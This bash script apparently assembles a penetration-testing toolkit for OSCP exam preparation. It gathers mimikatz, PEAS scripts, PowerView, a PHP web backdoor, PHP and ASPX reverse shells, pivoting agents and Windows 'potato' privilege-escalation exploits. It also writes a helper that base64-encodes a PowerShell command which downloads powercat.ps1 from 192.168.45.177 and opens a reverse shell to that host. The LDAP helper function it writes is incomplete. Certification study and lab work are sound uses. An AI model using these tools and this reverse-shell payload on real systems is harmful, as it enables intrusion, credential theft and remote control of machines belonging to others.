#!/bin/bash

# Make directories 

mkdir OSCP 
mkdir OSCP/linux
mkdir OSCP/linux/escalation
mkdir OSCP/windows
mkdir OSCP/windows/escalation
mkdir OSCP/windows/escalation/potatos
mkdir OSCP/pivoting
mkdir OSCP/pivoting/ligolo/
mkdir OSCP/pivoting/ligolo/windows-proxy
mkdir OSCP/pivoting/ligolo/windows-agent
mkdir OSCP/pivoting/ligolo/linux-proxy
mkdir OSCP/pivoting/ligolo/linux-agent
mkdir OSCP/windows/PowerShell
mkdir OSCP/windows/AD
mkdir OSCP/WebStuff



# Copy files 

cp /usr/share/windows-resources/PEASS-ng/winPEAS/winPEASexe/binaries/winPEASx64.exe OSCP/windows/escalation

cp /usr/share/windows-resources/binaries/nc.exe OSCP/windows/

cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe OSCP/windows/

cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 OSCP/windows/AD/

cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 OSCP/windows/AD/

cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 OSCP/windows/PowerShell/

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 OSCP/windows/PowerShell/

cp /usr/share/windows-resources/PEASS-ng/linPEAS/linpeas.sh OSCP/linux/escalation

cp /usr/share/webshells/php/simple-backdoor.php OSCP/WebStuff/

wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -P OSCP/WebStuff/

wget https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx -P OSCP/WebStuff/

wget https://github.com/Hackndo/pyGPOAbuse/archive/refs/heads/master.zip -P OSCP/windows/AD/ 

wget https://github.com/X-C3LL/GPOwned/archive/refs/heads/main.zip -P OSCP/windows/AD/

# Download ligolo and organize files based on proxy vs agent 

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz -P OSCP/pivoting/ligolo/linux-proxy/

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz -P OSCP/pivoting/ligolo/linux-agent/

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_windows_amd64.zip -P OSCP/pivoting/ligolo/windows-proxy/

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -P OSCP/pivoting/ligolo/windows-agent/


# Potatos


wget https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe -P OSCP/windows/escalation/potatos/

wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -P OSCP/windows/escalation/potatos/

wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip -P OSCP/windows/escalation/potatos/

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -P OSCP/windows/escalation/potatos/


# Helpful Script Creation

echo '$Text =  "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/powercat.ps1');powercat -c 192.168.45.177 -p 443 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText' > OSCP/windows/PowerShell/pull_rev.ps1


echo 'function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()' > OSCP/windows/AD/LDAPSearch.ps1


###ADD VBA STUFF FOR MACROS

### ADD ALIASES ? (NC, PYTHON, CDL, CDW, CDA, CDP)

### ADD POWERSHELL SCRIPT 

### seatbelt, unix privesc checker

### LIGOLO SCRIPTS (SET UP TUNNEL, INTERFACE UP ETC) 



